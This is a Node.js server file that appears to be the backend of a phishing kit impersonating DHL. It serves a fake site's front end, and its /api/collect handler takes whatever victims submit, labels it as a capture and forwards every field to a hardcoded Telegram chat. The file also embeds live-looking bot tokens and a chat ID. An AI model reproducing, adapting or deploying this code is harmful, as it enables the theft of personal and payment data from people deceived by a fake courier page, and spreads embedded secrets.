const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const DATA_BOT_TOKEN = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
const VISIT_BOT_TOKEN = "8421410574:AAGGyYXoD10wYMsUjbZWxCYO4J33tYmAPA4";
const CHAT_ID = "6788012481";

const mimeTypes = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css',
  '.js': 'application/javascript',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.json': 'application/json'
};

function sendTelegram(token, text) {
  const body = JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' });
  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${token}/sendMessage`,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
  };
  const req = https.request(options, () => {});
  req.on('error', () => {});
  req.write(body);
  req.end();
}

const server = http.createServer((req, res) => {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const urlPath = req.url.split('?')[0];

  // Intercept the React backend API calls
  if (req.method === 'POST' && urlPath === '/api/collect') {
    let body = '';
    req.on('data', chunk => { body += chunk.toString(); });
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const type = data.type || 'unknown';
        const payload = data.data || data;

        let msg = `📦 <b>DHL - ${type.toUpperCase()}</b>\n\n`;
        for (const key in payload) {
          msg += `<b>${key}:</b> ${payload[key]}\n`;
        }

        sendTelegram(DATA_BOT_TOKEN, msg);
        console.log(`[CAPTURE] ${type}:`, payload);
      } catch(e) {
        console.error('Parse error:', e);
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true }));
    });
    return;
  }

  // Static file serving
  let filePath = path.join(__dirname, urlPath === '/' ? 'index.html' : urlPath);

  if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
    filePath = path.join(__dirname, 'index.html');
  }

  const ext = path.extname(filePath).toLowerCase();
  const contentType = mimeTypes[ext] || 'text/plain';

  fs.readFile(filePath, (err, content) => {
    if (err) {
      fs.readFile(path.join(__dirname, 'index.html'), (err2, fallback) => {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(fallback);
      });
    } else {
      res.writeHead(200, { 'Content-Type': contentType });
      res.end(content);
    }
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`DHL app running on port ${PORT}`);
});
